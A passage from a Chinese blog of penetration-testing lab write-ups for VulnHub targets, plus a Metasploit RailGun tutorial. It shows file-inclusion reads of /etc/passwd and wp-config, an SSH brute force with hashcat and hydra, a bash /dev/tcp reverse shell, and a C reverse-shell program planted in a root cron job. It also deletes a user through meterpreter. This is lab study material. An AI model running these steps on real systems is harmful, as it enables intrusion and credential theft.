<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -w /usr/share/wordlists/wfuzz/general/common.txt -u <span class="string">&quot;http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=/etc/passwd&quot;</span> --ss root</span><br></pre></td></tr></table></figure>
<p>得
<code>http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd</code></p>
<p>尝试读取下 <code>NetworkFileManagerPHP.php</code></p>
<p><code>http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php</code></p>
<p>得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgJGZpbGUgPSAkX0dFVFsna2V5J107CiAgIGlmKGlzc2V0KCRmaWxlKSkKICAgewogICAgICAgaW5jbHVkZSgiJGZpbGUiKTsKICAgfQogICBlbHNlCiAgIHsKICAgICAgIGluY2x1ZGUoIk5ldHdvcmtGaWxlTWFuYWdlclBIUC5waHAiKTsKICAgfQogICAvKiBWR2hoZENCd1lYTnpkMjl5WkNCaGJHOXVaU0IzYjI0bmRDQm9aV3h3SUhsdmRTRWdTR0Z6YUdOaGRDQnpZWGx6SUhKMWJHVnpJR0Z5WlNCeWRXeGxjdz09ICovCj8+Cgo=</span><br><span class="line">=&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;NetworkFileManagerPHP.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw==</span><br><span class="line">=&gt;</span><br><span class="line">That password alone won<span class="string">&#x27;t help you! Hashcat says rules are rules</span></span><br></pre></td></tr></table></figure>
<p>没懂……</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>尝试利用文件包含漏洞获取 shell 【<a
href="https://zhuanlan.zhihu.com/p/371065742">文件包含漏洞GetShell利用方法丨漏洞银行技术分享
- 知乎</a>】未成功！</p>
<p>尝试读取 wp-config.php</p>
<p><code>http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php</code></p>
<p>得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the installation.</span></span><br><span class="line"><span class="comment"> * You don&#x27;t have to use the web site, you can copy this file to &quot;wp-config.php&quot;</span></span><br><span class="line"><span class="comment"> * and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;john&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R3v_m4lwh3r3_k1nG!!&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FS_METHOD&#x27;</span>, <span class="string">&#x27;direct&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication unique keys and salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases! You can generate these using</span></span><br><span class="line"><span class="comment"> * the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies.</span></span><br><span class="line"><span class="comment"> * This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;2uuBvc8SO5&#123;&gt;UwQ&lt;^5V5[UHBw%N&#125;-BwWqw|&gt;&lt;*HfBwJ( $&amp;%,(Zbg/jwFkRHf~v|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;ah&#125;&lt;I`52GL6C^@~x C9FpMq-)txgOmA&lt;~&#123;R5ktY/@.]dBF?keB3&#125;+Y^u!a54 Xc(&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;[a!K&#125;D&lt;7-vB3Y&amp;x_&lt;3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N&#125;b&#125;R@+/$+u*pJ|Z(xu-&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27; g4|@~:h,K29D&#125;$FL-f/eujw(VT;8wa7xRWpVR: &gt;&#125;,]!Ez.48E:ok 8Ip~5_o+a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;a;,O&lt;~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;GkU:% Lo&#125; 9&#125;w38i:%]=uq&amp;J6Z&amp;RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;#`F9&amp;pm_jY&#125;N3y0&amp;8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`&lt;$9A:9&lt;Kk^L&#125;fX@+iZ&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress database table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add any custom values between this line and the &quot;stop editing&quot; line. */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">	<span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试用 <code>john/R3v_m4lwh3r3_k1nG!!</code> 登录
ssh，未成功！看了其他人的 wp 说是要基于此密码用 hashcat 的 base64
规则生成个字典【hash 碰撞】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  --stdout passwd.txt -r /usr/share/hashcat/rules/best64.rule &gt; john_passwd.txt</span><br></pre></td></tr></table></figure>
<p>john_passwd.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">R3v_m4lwh3r3_k1nG!!</span><br><span class="line">!!Gn1k_3r3hwl4m_v3R</span><br><span class="line">R3V_M4LWH3R3_K1NG!!</span><br><span class="line">r3v_m4lwh3r3_k1nG!!</span><br><span class="line">R3v_m4lwh3r3_k1nG!!0</span><br><span class="line">R3v_m4lwh3r3_k1nG!!1</span><br><span class="line">R3v_m4lwh3r3_k1nG!!2</span><br><span class="line">R3v_m4lwh3r3_k1nG!!3</span><br><span class="line">R3v_m4lwh3r3_k1nG!!4</span><br><span class="line">R3v_m4lwh3r3_k1nG!!5</span><br><span class="line">R3v_m4lwh3r3_k1nG!!6</span><br><span class="line">R3v_m4lwh3r3_k1nG!!7</span><br><span class="line">R3v_m4lwh3r3_k1nG!!8</span><br><span class="line">R3v_m4lwh3r3_k1nG!!9</span><br><span class="line">R3v_m4lwh3r3_k1nG!!00</span><br><span class="line">R3v_m4lwh3r3_k1nG!!01</span><br><span class="line">R3v_m4lwh3r3_k1nG!!02</span><br><span class="line">R3v_m4lwh3r3_k1nG!!11</span><br><span class="line">R3v_m4lwh3r3_k1nG!!12</span><br><span class="line">R3v_m4lwh3r3_k1nG!!13</span><br><span class="line">R3v_m4lwh3r3_k1nG!!21</span><br><span class="line">R3v_m4lwh3r3_k1nG!!22</span><br><span class="line">R3v_m4lwh3r3_k1nG!!23</span><br><span class="line">R3v_m4lwh3r3_k1nG!!69</span><br><span class="line">R3v_m4lwh3r3_k1nG!!77</span><br><span class="line">R3v_m4lwh3r3_k1nG!!88</span><br><span class="line">R3v_m4lwh3r3_k1nG!!99</span><br><span class="line">R3v_m4lwh3r3_k1nG!!123</span><br><span class="line">R3v_m4lwh3r3_k1nG!!e</span><br><span class="line">R3v_m4lwh3r3_k1nG!!s</span><br><span class="line">R3v_m4lwh3r3_k1nG!a</span><br><span class="line">R3v_m4lwh3r3_k1nGs</span><br><span class="line">R3v_m4lwh3r3_k1nGa</span><br><span class="line">R3v_m4lwh3r3_k1nGer</span><br><span class="line">R3v_m4lwh3r3_k1nGie</span><br><span class="line">R3v_m4lwh3r3_k1no</span><br><span class="line">R3v_m4lwh3r3_k1ny</span><br><span class="line">R3v_m4lwh3r3_k1n123</span><br><span class="line">R3v_m4lwh3r3_k1nman</span><br><span class="line">R3v_m4lwh3r3_k1ndog</span><br><span class="line">1R3v_m4lwh3r3_k1nG!!</span><br><span class="line">theR3v_m4lwh3r3_k1nG!!</span><br><span class="line">d3v_m4lwh3r3_k1nG!!</span><br><span class="line">mav_m4lwh3r3_k1nG!!</span><br><span class="line">R3v_m4lwh3r3_k1nG!!</span><br><span class="line">R3v_m4lwh3r3_k1nG!!</span><br><span class="line">R3v_m4lwh3r3_k1nG!!</span><br><span class="line">R3_m4lwh3r3_k1nG!!</span><br><span class="line">R3m4lwh3r3_k1nG!!</span><br><span class="line">R3vm4lwh3r3_k1nG!!</span><br><span class="line">R3v_4lwh3r3_k1nG!!</span><br><span class="line">R3vm</span><br><span class="line">R3v_m1</span><br><span class="line">R3v_m4lwh3r3_k1nG!</span><br><span class="line">R3v_m4lwh3r3_k1nG</span><br><span class="line">R3v_m4lwh3r3_k1n</span><br><span class="line">R3v_m4lwh3r3_k1nR3v_m4lwh3r3_k1n</span><br><span class="line">Rv_m4lwh3r3_k1n</span><br><span class="line">1nG!</span><br><span class="line">h3r3_k1nG!!v_m4lw</span><br><span class="line">R3v_m4lwh3r3_k1n!</span><br><span class="line"> 3v_m4lwh3r3_k1nG</span><br><span class="line">G!!R3v_m4lwh3r3_k1n</span><br><span class="line">nG!!</span><br><span class="line">1nG!!</span><br><span class="line">k1nGk1nG</span><br><span class="line">n3v_</span><br><span class="line">_mR_mR</span><br><span class="line">Z3v_m4lwh3r3_k1nG!!</span><br><span class="line">U_m4lwh3r3_k1nG!!</span><br><span class="line">R3v_lw</span><br><span class="line">R3vmR3vm</span><br><span class="line">_mR</span><br><span class="line">R3r3R3r3</span><br><span class="line">Rrlw</span><br><span class="line">R3v_ml</span><br><span class="line">R4lwh3</span><br></pre></td></tr></table></figure>
<p>利用 hydra 爆破 ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l john -P john_passwd.txt ssh://192.168.159.147 -e nsr  -t 4 -v </span><br></pre></td></tr></table></figure>
<p>得 <code>login: john   password: R3v_m4lwh3r3_k1nG!!21</code></p>
<h3 id="提权">2.2. 提权</h3>
<p>操作时发现，shell
会被不断强制下线，密码也会不断被修改！应该有定时任务，可重新爆破获取</p>
<p><code>sudo -l</code> 找到个 <code>/usr/bin/time</code>
，可利用其提权至 <code>ippsec</code> 用户【<a
href="https://gtfobins.github.io/gtfobins/time/">time |
GTFOBins</a>】，不过依旧会被定时强制下线</p>
<p>直接反弹个 shell，避免被定时强制下线</p>
<p>ssh 登录 john 用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.159.129/9999 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p>反弹的 shell 中切换用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u ippsec /usr/bin/time /bin/bash</span><br></pre></td></tr></table></figure>
<p>获取完全的 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">export TERM=xterm </span><br><span class="line"><span class="comment"># Ctrl+z 退出 nc </span></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"><span class="comment"># 输入 reset </span></span><br><span class="line">stty rows <span class="number">46</span> columns <span class="number">188</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122241077.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122242256.png" /></p>
<p>上传 pspy64 执行看看</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122242741.png" /></p>
<p>经测 cat 和 vi 的功能互换了，用 vi 读取 supersecretfileuc.c【亦可尝试
tac,more 命令】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122245090.png" /></p>
<p>supersecretfileuc.c 会定时编译执行，查权限</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122254583.png" /></p>
<p>supersecretfileuc.c 编译的 rev 有 root 权限，替换 supersecretfileuc.c
可以反弹个 root 用户的 shell【<a
href="https://forum.ywhack.com/reverse-shell/">反弹shell生成器</a>】</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;192.168.159.129&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122257244.png" /></p>
<p>kali 开启监听等待即可！</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122259296.png" /></p>
<p>获取个完整 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">export TERM=xterm </span><br><span class="line"><span class="comment"># Ctrl+z 退出 nc </span></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"><span class="comment"># 输入 reset </span></span><br><span class="line">stty rows <span class="number">46</span> columns <span class="number">188</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404122259297.png" /></p>
<p>拿到 flag!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>RailGun 的实战测试</title>
    <url>/2021/11/23/RailGun%20%E7%9A%84%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="通过railgun在一个方法中调用基础api">1.
通过RailGun在一个方法中调用基础API</h2>
<p><strong>client.railgun.DLLname.function(parameters)</strong></p>
<p><strong>关键字client.railgun定义了我们需要客户端的RailGun功能。</strong></p>
<p><strong>关键字DLLname指明了在执行一个DLL文件调用时要使用的DLL名称。</strong></p>
<p><strong>关键字
function(parameters)指定需要从DLL文件中调用的API函数作为参数。</strong></p>
<h2 id="实例">2. 实例</h2>
<h3 id="实验环境">1、实验环境</h3>
<p><strong>攻击机：kali 2019-3</strong></p>
<p><strong>靶机：win2008R2+XPSP3</strong></p>
<p><strong>漏洞：ms17-010</strong></p>
<p><strong>注意，通过 ms17-010 获取目标系统（win2008+xpsp3）的
meterpreter 控制之后方可进行以下测试</strong></p>
<h3 id="锁屏测试">2、 锁屏测试</h3>
<p><strong>从user32.dll文件中调用的LockWorkStation()函数执行后导致被渗透系统进入了锁定状态</strong></p>
<p><strong>命令执行前：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123200936354-270627248.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; &gt; railgun.user32.LockWorkStation()</span><br><span class="line">=&gt; &#123;<span class="string">&quot;GetLastError&quot;</span>=&gt;0, <span class="string">&quot;ErrorMessage&quot;</span>=&gt;<span class="string">&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;</span>, <span class="string">&quot;return&quot;</span>=&gt;<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201032793-766034225.png" /></p>
<h3 id="删除某一用户">3、删除某一用户</h3>
<p><strong>client.railgun.netapi32.NetUserDel(arg1,agr2)</strong></p>
<p><strong>从客户的计算机上删除指定的用户。</strong></p>
<p><strong>删除前存在admin ……和root两个用户，如下图：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201233530-389989788.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell...</span><br><span class="line">[*] You are <span class="keyword">in</span> the <span class="string">&quot;client&quot;</span> (session) object</span><br><span class="line"></span><br><span class="line">irb: warn: can<span class="string">&#x27;t alias kill from irb_kill.</span></span><br><span class="line"><span class="string">&gt;&gt; railgun.netapi32.NetUserDel(nil,&quot;root&quot;)</span></span><br><span class="line"><span class="string">=&gt; &#123;&quot;GetLastError&quot;=&gt;997, &quot;ErrorMessage&quot;=&gt;&quot;FormatMessage failed to retrieve the error.&quot;, &quot;return&quot;=&gt;0&#125;</span></span><br><span class="line"><span class="string">&gt;&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>删除后仅剩administrator，如下图：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201254370-991738737.png" /></p>
<p><strong>注意：</strong>
值nil指明了用户是在局域网中工作。然而，如果系统的目标是在一个不同的网络中，则应该把参数的值设定为目标系统的NET-BIOS值</p>
<h3 id="获取系统信息">4、 获取系统信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; &gt; sys.config.sysinfo[<span class="string">&#x27;OS&#x27;</span>]</span><br><span class="line">=&gt; <span class="string">&quot;Windows 2008 R2 (Build 7601, Service Pack 1).&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="弹框测试">5、弹框测试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt; railgun.user32.MessageBoxA(0,<span class="string">&#x27;hello!&#x27;</span>,<span class="string">&#x27;pr1s0n&#x27;</span>,<span class="string">&#x27;MB_OK&#x27;</span>)</span><br><span class="line">=&gt; &#123;<span class="string">&quot;GetLastError&quot;</span>=&gt;0, <span class="string">&quot;ErrorMessage&quot;</span>=&gt;<span class="string">&quot;The operation completed successfully.&quot;</span>, <span class="string">&quot;return&quot;</span>=&gt;1&#125;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201538421-1240460063.png" /></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Vikings: 1</title>
    <url>/2024/04/20/Vikings%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/vikings-1,741/">Vikings:
1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts            </span><br><span class="line">12 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 720        </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.            </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      5     300  VMware, Inc.          </span><br><span class="line">192.168.159.254 00:50:56:fa:e9:b1      3     180  VMware, Inc.           </span><br><span class="line">192.168.159.155 00:0c:29:18:b9:f7      3     180  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.155</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-19 02:49 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.155</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)</span><br><span class="line">|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)</span><br><span class="line">|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2020-10-29 21:07  